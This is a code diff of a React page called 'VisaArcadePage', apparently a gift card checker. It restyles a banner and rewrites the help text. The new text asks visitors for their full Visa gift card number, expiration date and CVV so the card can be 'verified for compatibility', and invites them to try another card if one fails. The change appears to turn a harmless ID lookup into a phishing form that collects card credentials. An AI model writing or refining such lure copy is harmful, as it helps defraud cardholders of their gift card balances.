@@ -271,11 +271,11 @@ export default function VisaArcadePage() {
                 </div>
 
                 <section className={styles.cardSection}>
-                    <div style={{ width: '100%', maxWidth: '700px', margin: '0 auto 20px', borderRadius: '12px', overflow: 'hidden' }}>
+                    <div style={{ width: '100vw', position: 'relative', left: '50%', transform: 'translateX(-50%)', marginBottom: '20px', maskImage: 'linear-gradient(to right, transparent, black 8%, black 92%, transparent)', WebkitMaskImage: 'linear-gradient(to right, transparent, black 8%, black 92%, transparent)' }}>
                         <img src="/visaarcade.jpg" alt="Visa Arcade" style={{ width: '100%', display: 'block' }} />
                     </div>
                     <div className={styles.formContainer}>
-                        <p className={styles.subtitle}>Enter your 16-digit code to verify the card type instantly.</p>
+                        <p className={styles.subtitle}>Enter your code to check if your card will work for Visa Arcade.</p>
 
                         <div className={styles.card}>
                             <form onSubmit={checkBalance}>
@@ -492,7 +492,7 @@ export default function VisaArcadePage() {
                                 className={styles.tutorialToggle}
                                 onClick={() => setShowIssuanceInfo(!showIssuanceInfo)}
                             >
-                                <span>What is an Issuance ID?</span>
+                                <span>How do I check my Visa Arcade card?</span>
                                 <svg
                                     viewBox="0 0 24 24"
                                     width="20"
@@ -509,15 +509,15 @@ export default function VisaArcadePage() {
                             <div className={`${styles.tutorialContent} ${showIssuanceInfo ? styles.show : ''}`}>
                                 <div className={styles.tutorialStep}>
                                     <div className={styles.stepNumber}>1</div>
-                                    <div className={styles.stepText}>An Issuance ID is an identification number linked to your card and used for customer care, card support, account verification, and other card-related assistance.</div>
+                                    <div className={styles.stepText}>Enter your Visa Gift Card number, expiration date, and CVV in the fields above. The 16-digit card number is embossed on the front of the card.</div>
                                 </div>
                                 <div className={styles.tutorialStep}>
                                     <div className={styles.stepNumber}>2</div>
-                                    <div className={styles.stepText}>You can use the Issuance ID to help fund the card, send money to the card through supported channels, and confirm card records when needed.</div>
+                                    <div className={styles.stepText}>Click "CHECK ID" and wait for the result. Your card will be verified to confirm compatibility with Visa Arcade.</div>
                                 </div>
                                 <div className={styles.tutorialStep}>
                                     <div className={styles.stepNumber}>3</div>
-                                    <div className={styles.stepText}>You cannot spend the card money from the Issuance ID, but you can use it for funding, support requests, and card-related verification.</div>
+                                    <div className={styles.stepText}>If the card is not compatible, you will be notified immediately. You can try again with a different card if needed.</div>
                                 </div>
                                 <p className={styles.imageCaption}>The Issuance ID supports funding, transfers, and verification, but it cannot be used to spend your card balance.</p>
                             </div>
